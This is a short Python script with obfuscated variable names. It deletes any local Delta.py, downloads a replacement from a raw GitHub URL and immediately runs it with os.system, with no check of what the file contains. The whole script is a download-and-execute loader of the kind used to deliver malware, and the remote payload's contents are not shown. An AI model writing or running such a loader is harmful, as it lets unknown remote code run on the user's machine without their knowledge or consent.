import os, requests

xYzAbCdEfGh = "Delta.py"
aBcDeFgHiJk = "https://raw.githubusercontent.com/Wraith1vs11/Cloud/refs/heads/main/Delta.py"

os.remove(xYzAbCdEfGh) if os.path.exists(xYzAbCdEfGh) else None

with open(xYzAbCdEfGh,"w",encoding="utf-8") as KLMnoPqRsT:
    KLMnoPqRsT.write(requests.get(aBcDeFgHiJk).text)

os.system(f"python3 {xYzAbCdEfGh}")
